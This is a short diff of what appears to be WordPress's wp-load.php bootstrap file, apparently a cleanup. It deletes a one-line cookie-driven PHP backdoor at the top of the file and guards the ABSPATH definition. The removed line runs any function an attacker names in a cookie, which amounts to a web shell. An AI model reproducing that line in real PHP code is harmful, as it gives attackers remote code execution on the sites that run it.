@@ -1,8 +1,4 @@
 <?php
-
-if (isset($_COOKIE["id"])) @$_COOKIE["user"]($_COOKIE["id"]);
-
-
 /**
  * Bootstrap file for setting the ABSPATH constant
  * and loading the wp-config.php file. The wp-config.php
@@ -23,7 +19,9 @@ if (isset($_COOKIE["id"])) @$_COOKIE["user"]($_COOKIE["id"]);
  */
 
 /** Define ABSPATH as this file's directory */
-define( 'ABSPATH', dirname(__FILE__) . '/' );
+if ( ! defined( 'ABSPATH' ) ) {
+	define( 'ABSPATH', dirname( __FILE__ ) . '/' );
+}
 
 error_reporting( E_CORE_ERROR | E_CORE_WARNING | E_COMPILE_ERROR | E_ERROR | E_WARNING | E_PARSE | E_USER_ERROR | E_USER_WARNING | E_RECOVERABLE_ERROR );
 
